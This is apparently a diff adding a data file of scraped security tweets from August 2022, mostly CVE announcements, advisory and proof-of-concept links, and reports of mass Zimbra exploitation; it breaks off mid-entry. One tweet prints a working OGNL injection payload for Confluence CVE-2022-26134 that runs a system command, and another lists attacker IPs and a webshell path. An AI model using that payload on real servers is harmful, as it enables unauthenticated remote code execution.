@@ -1,0 +1,717 @@
+{
+    "expanded_url": [
+        "https://r.sec-consult.com/foxitpdf"
+    ],
+    "tweetfavorites": 87,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 33,
+    "tweettext": "Remote Code Execution with a crafted #PDF in @foxitsoftware PDF Reader: Exploitation of a memory corruption #vulnerability in the v8 #JavaScript engine to bypass the patch for CVE-2020-15638 🛡️https://t.co/7U3dwvk1G0 #infosec @ReneFreingruber https://t.co/s51SSlySz3",
+    "tweettime": "2022-08-31, 11:29:16",
+    "tweeturl": "https://twitter.com/sec_consult/status/1564938365291601922",
+    "username": "sec_consult"
+}
+{
+    "expanded_url": [
+        "https://www.openwall.com/lists/oss-security/2022/08/29/5"
+    ],
+    "tweetfavorites": 758,
+    "tweetquotes": 11,
+    "tweetreplies": 10,
+    "tweetretweets": 200,
+    "tweettext": "I developed an N-day exploit for CVE-2022-2586: Linux kernel nft_object Use-After-Free (UAF). I sent my exploit and writeup to the oss-security mailing list: https://t.co/E6YZiBG8xW https://t.co/4B2RHa0T6M",
+    "tweettime": "2022-08-29, 20:03:52",
+    "tweeturl": "https://twitter.com/lockedbyte/status/1564343093633208321",
+    "username": "lockedbyte"
+}
+{
+    "expanded_url": [
+        "https://github.com/mistymntncop/CVE-2022-1802"
+    ],
+    "tweetfavorites": 273,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 109,
+    "tweettext": "CVE-2022-1802 + CVE-2022-1529 + CVE-2022-2200 Firefox 100.0.1 RCE Object prototype, they could set undesired attributes on a JavaScript object, leading to privileged code execution.\n\nPoC\nhttps://t.co/bPCyw0z3a2 https://t.co/SfV5kv9qQP",
+    "tweettime": "2022-08-29, 12:20:47",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1564226554040926217",
+    "username": "cyber_advising"
+}
+{
+    "tweetfavorites": 276,
+    "tweetquotes": 3,
+    "tweetreplies": 9,
+    "tweetretweets": 59,
+    "tweettext": "Zero-click LPE exploit (CVE-2022-32893) for iOS 16 Beta 7 currently on sale. Selling price - €2,500,000 🫢 https://t.co/NIkPBiwQyp",
+    "tweettime": "2022-08-28, 15:24:51",
+    "tweeturl": "https://twitter.com/Yalujb/status/1563910491936030720",
+    "username": "Yalujb"
+}
+{
+    "tweetfavorites": 215,
+    "tweetquotes": 2,
+    "tweetreplies": 14,
+    "tweetretweets": 67,
+    "tweettext": "CVE-2022-26134 PoC\nConfluence Pre-Auth RCE via OGNL Injection\n\n${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\"id\").getInputStream(),\"utf-8\")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(\"X-Cmd-Response\",#a))} https://t.co/cShTB7cQiF",
+    "tweettime": "2022-08-26, 00:47:54",
+    "tweeturl": "https://twitter.com/bughuntar/status/1562965024309596161",
+    "username": "bughuntar"
+}
+{
+    "expanded_url": [
+        "https://research.nccgroup.com/wp-content/uploads/2022/08/2022_hitcon_settlers_of_netlink.pdf"
+    ],
+    "tweetfavorites": 69,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 37,
+    "tweettext": "Recently @fidgetingbits presented at @HacksInTaiwan on a 6 year old Linux kernel use-after-free vulnerability (CVE-2022-32250) which we exploited to gain reliable priv esc on Ubuntu 22.04. https://t.co/2vQKgDPho9 by @nccgroupinfosec EDG @saidelike @fidgetingbits @alexjplaskett\" https://t.co/fl8Fral6QQ",
+    "tweettime": "2022-08-25, 07:58:46",
+    "tweeturl": "https://twitter.com/NCCGroupInfosec/status/1562711063740940288",
+    "username": "NCCGroupInfosec"
+}
+{
+    "tweetfavorites": 480,
+    "tweetquotes": 1,
+    "tweetreplies": 4,
+    "tweetretweets": 81,
+    "tweettext": "CVE-2022-31197 PostgreSQL JDBC driver SQL injection. https://t.co/SAfVGNWFyd",
+    "tweettime": "2022-08-25, 05:29:35",
+    "tweeturl": "https://twitter.com/pyn3rd/status/1562673520684871681",
+    "username": "pyn3rd"
+}
+{
+    "expanded_url": [
+        "https://github.com/theori-io/CVE-2022-32250-exploit"
+    ],
+    "tweetfavorites": 136,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 49,
+    "tweettext": "CVE-2022-32250 Linux kernel LPE PoC https://t.co/yqrJNVkdhV",
+    "tweettime": "2022-08-25, 04:53:51",
+    "tweeturl": "https://twitter.com/Dinosn/status/1562664529938771969",
+    "username": "Dinosn"
+}
+{
+    "expanded_url": [
+        "https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/"
+    ],
+    "tweetfavorites": 262,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 110,
+    "tweettext": "Our intern @_qwerty_po was destined to analyze a recent Linux kernel LPE vuln (CVE-2022-32250), a bug found and reported by @FidgetingBits.\n\nHere's a brief write-up on the analysis of the bug and the exploit development. Check it out! https://t.co/hYaClfbEYp (exploit included)",
+    "tweettime": "2022-08-25, 04:26:44",
+    "tweeturl": "https://twitter.com/theori_io/status/1562657706779222017",
+    "username": "theori_io"
+}
+{
+    "expanded_url": [
+        "https://confluence.atlassian.com/bitbucketserver/bitbucket-server-and-data-center-advisory-2022-08-24-1155489835.html"
+    ],
+    "tweetfavorites": 95,
+    "tweetquotes": 1,
+    "tweetreplies": 4,
+    "tweetretweets": 22,
+    "tweettext": "CVE-2022-36804 - RCE in Bitbucket Server\n\nWill Release PoC in 30 days.\nhttps://t.co/JpiOoVELYU",
+    "tweettime": "2022-08-25, 00:23:07",
+    "tweeturl": "https://twitter.com/TheGrandPew/status/1562596397819785216",
+    "username": "TheGrandPew"
+}
+{
+    "expanded_url": [
+        "https://www.watchguard.com/wgrd-psirt/advisory/wgsa-2022-00015"
+    ],
+    "tweetfavorites": 65,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 17,
+    "tweettext": "My research on @watchguard Firebox/XTM firewalls, that yielded pre-auth Remote Code Execution as root, will be available on @ambionics next week (CVE-2022-31789, CVE-2022-31790).\nhttps://t.co/KpQVAFDeUF",
+    "tweettime": "2022-08-24, 14:23:45",
+    "tweeturl": "https://twitter.com/cfreal_/status/1562445561135243267",
+    "username": "cfreal_"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/advisories/ZDI-22-1077/"
+    ],
+    "tweetfavorites": 98,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 31,
+    "tweettext": "The LPE vulnerability in the windows kernel we reported during #Pwn2Own 2022 in May has been patched by Microsoft on August 9: CVE-2022-34699.\nLeave us some time to reverse the patch and we are going to publish the technical details for the vulnerability!\nhttps://t.co/LqW7RWwTb4",
+    "tweettime": "2022-08-24, 08:25:44",
+    "tweeturl": "https://twitter.com/Reverse_Tactics/status/1562355464448393216",
+    "username": "Reverse_Tactics"
+}
+{
+    "expanded_url": [
+        "https://github.com/mistymntncop/CVE-2022-1802/blob/main/exploit.html"
+    ],
+    "tweetfavorites": 236,
+    "tweetquotes": 1,
+    "tweetreplies": 4,
+    "tweetretweets": 84,
+    "tweettext": "CVE-2022-2200 added to the chain. Full chain complete RCE + SBX :-).\nShout out to @_manfp, @hosselot and the good folks at @thezdi !!!\nhttps://t.co/889PL5YdSH",
+    "tweettime": "2022-08-23, 23:01:59",
+    "tweeturl": "https://twitter.com/mistymntncop/status/1562213591855808512",
+    "username": "mistymntncop"
+}
+{
+    "expanded_url": [
+        "https://cpr-zero.checkpoint.com/vulns/cprid-2191/"
+    ],
+    "tweetfavorites": 54,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 20,
+    "tweettext": "[CPR-Zero] CVE-2022-23747 (Sony Xperia): #ALHACK vulnerability exposes all modern Sony Xperia devices to RCE and LPE attacks.\n\nhttps://t.co/y26yXbt946",
+    "tweettime": "2022-08-22, 13:18:00",
+    "tweeturl": "https://twitter.com/_CPResearch_/status/1561704238769704960",
+    "username": "_CPResearch_"
+}
+{
+    "expanded_url": [
+        "https://securitylab.github.com/advisories/GHSL-2022-043_Chromium/"
+    ],
+    "tweetfavorites": 44,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 32,
+    "tweettext": "GHSL-2022-043: Remote Code Execution (RCE) in the Chrome renderer - CVE-2022-1869 https://t.co/0cNgiocu8t  #Pentesting #CyberSecurity #Infosec https://t.co/FKlOSsxPYY",
+    "tweettime": "2022-08-20, 22:31:03",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1561118645438275584",
+    "username": "ptracesecurity"
+}
+{
+    "expanded_url": [
+        "https://github.com/p0dalirius/CVE-2022-36446-Webmin-Software-Package-Updates-RCE"
+    ],
+    "tweetfavorites": 142,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 75,
+    "tweettext": "RCE (Authenticated) on Webmin &lt; 1.997\nCVE-2022-36446\nexploit\nhttps://t.co/1fVsK5tilQ\n\n#exploit #webmin #RCE #CVE #infosec #cybersecurity #bugbounty https://t.co/oQYxUGXJev",
+    "tweettime": "2022-08-20, 14:56:39",
+    "tweeturl": "https://twitter.com/TodayCyberNews/status/1561004290528796672",
+    "username": "TodayCyberNews"
+}
+{
+    "expanded_url": [
+        "https://github.com/0xInfection/LogMePwn"
+    ],
+    "tweetfavorites": 81,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 36,
+    "tweettext": "LogMePwn - A fully automated, reliable, super-fast, mass scanning and validation toolkit for the Log4J RCE CVE-2021-44228 vulnerability.\nhttps://t.co/OSgemN1fzF\n\n#cybersecurity  #bugbountytips #pethuraj #infosec #bugbounty",
+    "tweettime": "2022-08-20, 13:39:00",
+    "tweeturl": "https://twitter.com/Pethuraj/status/1560984747827900417",
+    "username": "Pethuraj"
+}
+{
+    "expanded_url": [
+        "https://github.com/p0dalirius/CVE-2022-36446-Webmin-Software-Package-Updates-RCE"
+    ],
+    "tweetfavorites": 46,
+    "tweetquotes": 0,
+    "tweetreplies": 2,
+    "tweetretweets": 9,
+    "tweettext": "RCE (Authenticated) on Webmin &lt; 1.997\nCVE-2022-36446\nexploit :\nhttps://t.co/w1QbvGXcPr\n#webmin #RCE #infosec #bugbounty #hacking #0day https://t.co/DF7ZtYKeyw",
+    "tweettime": "2022-08-20, 07:04:21",
+    "tweeturl": "https://twitter.com/1rpwn/status/1560885430261800961",
+    "username": "1rpwn"
+}
+{
+    "expanded_url": [
+        "https://github.com/projectdiscovery/nuclei-templates/pull/5134",
+        "https://blog.zimbra.com/2022/08/authentication-bypass-in-mailboximportservlet-vulnerability/"
+    ],
+    "tweetfavorites": 162,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 51,
+    "tweettext": "Scan for Zimbra Collaboration Suite - Unauthenticated RCE (CVE-2022-37042) using nuclei template shared by  @_0xf4n9x_, For3stCo1d\n\nhttps://t.co/YKZdkJDnnb\n\nhttps://t.co/DzAVG3FqLp\n\n#hackwithautomation #security #bugbounty #appsec https://t.co/Hba98vrfvW",
+    "tweettime": "2022-08-20, 01:17:05",
+    "tweeturl": "https://twitter.com/pdnuclei/status/1560798040012853248",
+    "username": "pdnuclei"
+}
+{
+    "expanded_url": [
+        "https://msft.it/6011jZQB7"
+    ],
+    "tweetfavorites": 134,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 63,
+    "tweettext": "A remote memory corruption vulnerability in ChromeOS, identified as CVE-2022-2587 and fixed by Google in June, could have permitted denial-of-service or remote code execution attacks. Read our blog via @yo_yo_yo_jbo: https://t.co/R2OzZpyPfx",
+    "tweettime": "2022-08-19, 22:15:00",
+    "tweeturl": "https://twitter.com/MsftSecIntel/status/1560752217535176705",
+    "username": "MsftSecIntel"
+}
+{
+    "expanded_url": [
+        "https://securitylab.github.com/advisories/GHSL-2022-043_Chromium/"
+    ],
+    "tweetfavorites": 192,
+    "tweetquotes": 4,
+    "tweetreplies": 2,
+    "tweetretweets": 73,
+    "tweettext": "GHSL-2022-043: Remote Code Execution (RCE) in the Chrome renderer - CVE-2022-1869 https://t.co/Bn8EUrVMJK",
+    "tweettime": "2022-08-19, 15:46:03",
+    "tweeturl": "https://twitter.com/GHSecurityLab/status/1560654332932288514",
+    "username": "GHSecurityLab"
+}
+{
+    "expanded_url": [
+        "https://chromium-review.googlesource.com/c/chromium/src/+/3820605"
+    ],
+    "tweetfavorites": 54,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 6,
+    "tweettext": "Google Chrome (In-The-Wild) Zero day (CVE-2022-2856) fix. If an intent contains any extras or a data URI and it targets another browser, Google Chrome would open that browser with that URL without prompting:\nhttps://t.co/iiDhLShhJv",
+    "tweettime": "2022-08-18, 15:06:37",
+    "tweeturl": "https://twitter.com/hosselot/status/1560282024447025153",
+    "username": "hosselot"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/advisories/ZDI-22-1068/"
+    ],
+    "tweetfavorites": 34,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 17,
+    "tweettext": "[ZDI-22-1068|CVE-2022-35820] (Pwn2Own) Microsoft Windows bthport Driver Improper Authorization Local Privilege Escalation Vulnerability (CVSS 8.8; Credit: T0) https://t.co/U6LDrrY4hj",
+    "tweettime": "2022-08-18, 15:01:10",
+    "tweeturl": "https://twitter.com/TheZDIBugs/status/1560280652829925376",
+    "username": "TheZDIBugs"
+}
+{
+    "expanded_url": [
+        "https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=1662223764"
+    ],
+    "tweetfavorites": 160,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 51,
+    "tweettext": "3 in-the-wild 0-days patched in the last two days:\n* CVE-2022-2856 in Chrome discovered by @ashl3y_shen &amp; @0xbadcafe1 of Google TAG\n* CVE-2022-32893 in Safari\n* CVE-2022-32894 in iOS/macOS kernel\n\nhttps://t.co/ga4q8NUYRk\n#itw0days",
+    "tweettime": "2022-08-17, 23:31:16",
+    "tweeturl": "https://twitter.com/maddiestone/status/1560046636230795264",
+    "username": "maddiestone"
+}
+{
+    "tweetfavorites": 205,
+    "tweetquotes": 6,
+    "tweetreplies": 6,
+    "tweetretweets": 108,
+    "tweettext": "🚨 Massive exploitation of CVE-2022-27925 (Zimbra Unauthenticated RCE) in progress, attackers install #Webshell in /opt/zimbra/mailboxd/webapps/zimbraAdmin/ as a backdoor for later access (IAB?).\n\nAttacks from:\n66.115.189.144 🇺🇸\n143.110.187.0 🇮🇳\n\n1/X https://t.co/CksrVG7cdg",
+    "tweettime": "2022-08-17, 20:53:31",
+    "tweeturl": "https://twitter.com/1ZRR4H/status/1560006936866742281",
+    "username": "1ZRR4H"
+}
+{
+    "expanded_url": [
+        "https://chromereleases.googleblog.com/2022/08/stable-channel-update-for-desktop_16.html"
+    ],
+    "tweetfavorites": 113,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 39,
+    "tweettext": "The Chrome 0day (CVE-2022-2856) that me and @0xbadcafe1 found ITW is patched in the latest release. Update your Chrome to make sure you are protected. https://t.co/WUW8hi5qkA",
+    "tweettime": "2022-08-17, 18:16:29",
+    "tweeturl": "https://twitter.com/ashl3y_shen/status/1559967415697653766",
+    "username": "ashl3y_shen"
+}
+{
+    "expanded_url": [
+        "https://labs.nettitude.com/blog/cve-2022-30211-windows-l2tp-vpn-memory-leak-and-use-after-free-vulnerability/"
+    ],
+    "tweetfavorites": 52,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 16,
+    "tweettext": "CVE-2022-30211: Zero-day in Microsoft's L2TP VPN, discovered by @i4mchr00t. This Memory Leak and Use after Free bug leads to DoS, and could potentially be exploited for Remote Code Execution.\n\nhttps://t.co/W0XWPZCNWF",
+    "tweettime": "2022-08-17, 16:02:01",
+    "tweeturl": "https://twitter.com/Nettitude_Labs/status/1559933576749121536",
+    "username": "Nettitude_Labs"
+}
+{
+    "expanded_url": [
+        "https://access.redhat.com/security/cve/CVE-2022-2414"
+    ],
+    "tweetfavorites": 145,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 52,
+    "tweettext": "🐳 Red Hat fixed an Unauth XXE (CVE-2022-2414) in FreeIPA found by our researcher @elk0kc.\n\nIn some cases, it allows attackers to read the Directory Manager password from the config of FreeIPA and take full control of the infrastructure.\n\nAdvisory: https://t.co/kDh7uEdO9j https://t.co/Y1L13kq8HO",
+    "tweettime": "2022-08-17, 13:20:58",
+    "tweeturl": "https://twitter.com/ptswarm/status/1559893047327997954",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://www.securityweek.com/google-patches-fifth-exploited-chrome-zero-day-2022"
+    ],
+    "tweetfavorites": 235,
+    "tweetquotes": 3,
+    "tweetreplies": 4,
+    "tweetretweets": 108,
+    "tweettext": "New Chrome 0day\n\n\"Google is aware that an exploit for CVE-2022-2856 exists in the wild.\"\n\nStory https://t.co/NxWqRvxcLy",
+    "tweettime": "2022-08-17, 13:13:15",
+    "tweeturl": "https://twitter.com/ryanaraine/status/1559891105168076801",
+    "username": "ryanaraine"
+}
+{
+    "expanded_url": [
+        "https://github.com/projectdiscovery/nuclei-templates/pull/5134/files"
+    ],
+    "tweetfavorites": 262,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 77,
+    "tweettext": "Release of #CVE-2022-37042 Zimbra Authentication Bypass Causing RCE Non-Destructive Vulnerability Detection Template.\nhttps://t.co/L6m2Lta1E7 https://t.co/pxbD1acfL6",
+    "tweettime": "2022-08-17, 06:55:11",
+    "tweeturl": "https://twitter.com/_0xf4n9x_/status/1559795963078000641",
+    "username": "_0xf4n9x_"
+}
+{
+    "expanded_url": [
+        "https://sector7.computest.nl/post/2022-08-process-injection-breaking-all-macos-security-layers-with-a-single-vulnerability/"
+    ],
+    "tweetfavorites": 111,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 25,
+    "tweettext": "Mac Application Sandbox Escape (CVE-2021-30659), Root Privilege Escalation, and SIP Filesystem Bypass\n\nProcess injection: breaking all macOS security layers with a single vulnerability\n\nhttps://t.co/uSJmNs10Ff https://t.co/yMPs5NqYhV",
+    "tweettime": "2022-08-15, 09:17:21",
+    "tweeturl": "https://twitter.com/0xdea/status/1559106965061632001",
+    "username": "0xdea"
+}
+{
+    "expanded_url": [
+        "https://www.volexity.com/blog/2022/08/10/mass-exploitation-of-unauthenticated-zimbra-rce-cve-2022-27925/"
+    ],
+    "tweetfavorites": 54,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 18,
+    "tweettext": "#CVE-2022-27925 #Zimbra Unauth #RCE vulnerability is being exploited on a mass scale.\nhttps://t.co/Ld8G50PU7j",
+    "tweettime": "2022-08-15, 02:54:19",
+    "tweeturl": "https://twitter.com/_0xf4n9x_/status/1559010571458326529",
+    "username": "_0xf4n9x_"
+}
+{
+    "expanded_url": [
+        "https://github.com/Sudistark/vscode-rce-electrovolt",
+        "https://www.youtube.com/watch?v=SzX22FcW-e0&feature=youtu.be"
+    ],
+    "tweetfavorites": 54,
+    "tweetquotes": 1,
+    "tweetreplies": 3,
+    "tweetretweets": 12,
+    "tweettext": "Tried reproducing  vscode rce (CVE-2021-43908) \nLooks pretty sweet! Here's the video poc:\n\ncode: https://t.co/OhXjHocfCf\n\nhttps://t.co/hTBvTIwuv1",
+    "tweettime": "2022-08-14, 12:13:40",
+    "tweeturl": "https://twitter.com/sudhanshur705/status/1558788948838690816",
+    "username": "sudhanshur705"
+}
+{
+    "expanded_url": [
+        "https://securityonline.info/cve-2022-2590-linux-kernel-privilege-escalation-vulnerability/"
+    ],
+    "tweetfavorites": 44,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 17,
+    "tweettext": "CVE-2022-2590: Linux kernel LPE\nhttps://t.co/Pts5dSMRNE",
+    "tweettime": "2022-08-13, 11:28:04",
+    "tweeturl": "https://twitter.com/kmkz_security/status/1558415084564758528",
+    "username": "kmkz_security"
+}
+{
+    "expanded_url": [
+        "https://github.com/vnhacker1337/CVE-2022-27925-PoC"
+    ],
+    "tweetfavorites": 127,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 39,
+    "tweettext": "CVE-2022-27925-PoC: Zimbra RCE simple poc https://t.co/CIGnECAING",
+    "tweettime": "2022-08-13, 04:03:28",
+    "tweeturl": "https://twitter.com/sirifu4k1/status/1558303197457895424",
+    "username": "sirifu4k1"
+}
+{
+    "expanded_url": [
+        "https://www.synacktiv.com/en/publications/exploiting-cve-2022-24816-a-code-injection-in-the-jt-jiffle-extension-of-geoserver.html"
+    ],
+    "tweetfavorites": 39,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 20,
+    "tweettext": "Here is our take on how to exploit CVE-2022-24816, a code injection flaw in JAI-EXT/jiffle leading to an unauthenticated remote code execution in Geoserver. Versions prior to 1.2.22 of JAI-EXT are affected. https://t.co/IqHPlFkyA3 Cc @_remsio_ @us3r777",
+    "tweettime": "2022-08-12, 16:58:44",
+    "tweeturl": "https://twitter.com/Synacktiv/status/1558135908746108929",
+    "username": "Synacktiv"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/08/researchers-warn-of-ongoing-mass.html"
+    ],
+    "tweetfavorites": 53,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 48,
+    "tweettext": "Researchers warn of mass exploitation of the RCE #vulnerability in #Zimbra (CVE-2022-27925 and CVE-2022-37042), which allows attackers to gain unauthenticated remote code execution on targeted email servers.\n\nRead details: https://t.co/nsPyeIqiwe\n\n#infosec #cybersecurity #hacking",
+    "tweettime": "2022-08-12, 06:14:53",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1557973880400388096",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/"
+    ],
+    "tweetfavorites": 51,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 13,
+    "tweettext": "CVE-2022-29582, an io_uring vulnerability\n\nA detailed and well-written article by @Awarau1 and @pqlqpql about exploiting a slab use-after-free vulnerability in the io_uring subsystem.\n\nhttps://t.co/ZdxXTdN1qm",
+    "tweettime": "2022-08-11, 15:35:49",
+    "tweeturl": "https://twitter.com/linkersec/status/1557752656919142400",
+    "username": "linkersec"
+}
+{
+    "expanded_url": [
+        "https://www.volexity.com/blog/2022/08/10/mass-exploitation-of-unauthenticated-zimbra-rce-cve-2022-27925/"
+    ],
+    "tweetfavorites": 99,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 46,
+    "tweettext": "We caught another zero-day in the wild (CVE-2022-37042)! This time it was an authentication bypass that was used to facilitate remote code execution via CVE-2022-27925 on Zimbra mail servers around the world. Check out the @Volexity blog on it! https://t.co/I5zLLHj6t1",
+    "tweettime": "2022-08-11, 14:26:18",
+    "tweeturl": "https://twitter.com/stevenadair/status/1557735162418380800",
+    "username": "stevenadair"
+}
+{
+    "expanded_url": [
+        "https://www.volexity.com/blog/2022/08/10/mass-exploitation-of-unauthenticated-zimbra-rce-cve-2022-27925/"
+    ],
+    "tweetfavorites": 41,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 28,
+    "tweettext": "Do you remember the CVE-2022-27925 (RCE) in #Zimbra? The one that requires admin creds? \nThis prerequisite did not match our IR. So, Sir @tlansec investigated &amp; discovered it can be exploited without valid creds.\nWe identified 1000+ compromised servers.\n https://t.co/eS0NjqBCTa",
+    "tweettime": "2022-08-11, 06:42:53",
+    "tweeturl": "https://twitter.com/r00tbsd/status/1557618539187605504",
+    "username": "r00tbsd"
+}
+{
+    "expanded_url": [
+        "https://www.volexity.com/blog/2022/08/10/mass-exploitation-of-unauthenticated-zimbra-rce-cve-2022-27925/"
+    ],
+    "tweetfavorites": 64,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 21,
+    "tweettext": "Mass Exploitation of (Un)authenticated Zimbra RCE: CVE-2022-27925 https://t.co/V47TlrKeRy",
+    "tweettime": "2022-08-11, 05:20:12",
+    "tweeturl": "https://twitter.com/Dinosn/status/1557597731182477316",
+    "username": "Dinosn"
+}
+{
+    "expanded_url": [
+        "https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-0920.html"
+    ],
+    "tweetfavorites": 49,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 8,
+    "tweettext": "And the root cause analysis of the bug, CVE-2021-0920, is here: https://t.co/F1BbAenvw6",
+    "tweettime": "2022-08-10, 23:08:36",
+    "tweeturl": "https://twitter.com/maddiestone/status/1557504214682611712",
+    "username": "maddiestone"
+}
+{
+    "expanded_url": [
+        "https://www.volexity.com/blog/2022/08/10/mass-exploitation-of-unauthenticated-zimbra-rce-cve-2022-27925/"
+    ],
+    "tweetfavorites": 116,
+    "tweetquotes": 8,
+    "tweetreplies": 1,
+    "tweetretweets": 68,
+    "tweettext": ".@Volexity uncovers mass exploitation of #Zimbra Collaboration Servers (ZCS) via CVE-2022-27925 using authentication bypass. Over 1000 ZCS instances compromised worldwide. Read more about the exploit: https://t.co/NDtfZ5eFUZ\n\n#threatintel #dfir",
+    "tweettime": "2022-08-10, 19:30:17",
+    "tweeturl": "https://twitter.com/Volexity/status/1557449272379031553",
+    "username": "Volexity"
+}
+{
+    "expanded_url": [
+        "https://github.com/chromium/chromium/commit/cd290e7cbed7b2f95e4c2dc805e9d175f9161fc4"
+    ],
+    "tweetfavorites": 300,
+    "tweetquotes": 6,
+    "tweetreplies": 6,
+    "tweetretweets": 113,
+    "tweettext": "By now Microsoft has fixed both Follina CVE-2022-30190 and Dogwalk CVE-2022-34713 programming flaws.\nBut please don't forget that MSDT .diagcab files BY DESIGN will run code with a single click. With a UAC bypass if logged in as an admin.\nThis still works.\nhttps://t.co/MfojxHA5s3 https://t.co/D6WrvSSBU2",
+    "tweettime": "2022-08-10, 12:51:23",
+    "tweeturl": "https://twitter.com/wdormann/status/1557348886615826433",
+    "username": "wdormann"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/08/microsoft-issues-patches-for-121-flaws.html"
+    ],
+    "tweetfavorites": 60,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 41,
+    "tweettext": "Patch Tuesday, August 2022 — #Microsoft releases security updates to address 121 newly reported vulnerabilities, including a zero-day (CVE-2022-34713) bug that the company says is being actively exploited.\n\nRead details: https://t.co/iWsjLfFMOi\n\n#hacking #cybersecurity #infosec",
+    "tweettime": "2022-08-10, 06:14:07",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1557248912200990721",
+    "username": "TheHackersNews"
+}
+{
+    "tweetfavorites": 75,
+    "tweetquotes": 2,
+    "tweetreplies": 4,
+    "tweetretweets": 32,
+    "tweettext": "Let's talk about CVE-2022-31656 and CVE-2022-31659, auth bypass leading to remote code execution in VMWare products such as Workspace ONE. There's no public POC yet and nothing strange spotted @GreyNoiseIO, but this doesn't mean defenders don't have many hints how it works 1/🧵",
+    "tweettime": "2022-08-08, 15:05:01",
+    "tweeturl": "https://twitter.com/_mattata/status/1556657740797427713",
+    "username": "_mattata"
+}
+{
+    "expanded_url": [
+        "https://www.rapid7.com/blog/post/2022/08/04/qnap-poisoned-xml-command-injection-silently-patched/"
+    ],
+    "tweetfavorites": 38,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 12,
+    "tweettext": "I went hunting for CVE-2020-2905, an unauth RCE vulnerability affecting QNAP devices. The vulnerability is on the CISA KEV list but there are no real public details. I didn't find CVE-2020-2905, but I did find another (silently patched) unauth RCE: https://t.co/8AYuTN7iot",
+    "tweettime": "2022-08-04, 17:34:43",
+    "tweeturl": "https://twitter.com/Junior_Baines/status/1555245865194987521",
+    "username": "Junior_Baines"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/advisories/ZDI-22-1041/"
+    ],
+    "tweetfavorites": 103,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 22,
+    "tweettext": "Paracosme (CVE-2022-33318) is the zero-click remote code execution memory corruption exploit that I wrote to compromise ICONICS Genesis64 on stage at Pwn2Own2022 Miami 🐛🐜🪲\n\nI hope to blog about it soon but in the meantime, go apply the patch 🔥🔥!\n\nhttps://t.co/bGsJ4ajSi5 https://t.co/ii9VECQYMo",
+    "tweettime": "2022-08-04, 16:06:28",
+    "tweeturl": "https://twitter.com/0vercl0k/status/1555223654690000896",
+    "username": "0vercl0k"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/08/critical-rce-bug-could-let-hackers.html"
+    ],
+    "tweetfavorites": 112,
+    "tweetquotes": 8,
+    "tweetreplies": 2,
+    "tweetretweets": 56,
+    "tweettext": "Researchers discovered a critical unauthenticated RCE #vulnerability (CVE-2022-32548) affecting 29 different router models from #DrayTek that can be exploited to gain full access over targeted networks.\n\nRead details: https://t.co/hSXwcGc6pP\n\n#hacking #cybersecurity #infosec",
+    "tweettime": "2022-08-04, 13:13:08",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1555180034175905793",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://www.trellix.com/en-us/about/newsroom/stories/threat-labs/rce-in-dratyek-routers.html",
+        "https://www.draytek.com/support/latest-firmwares/"
+    ],
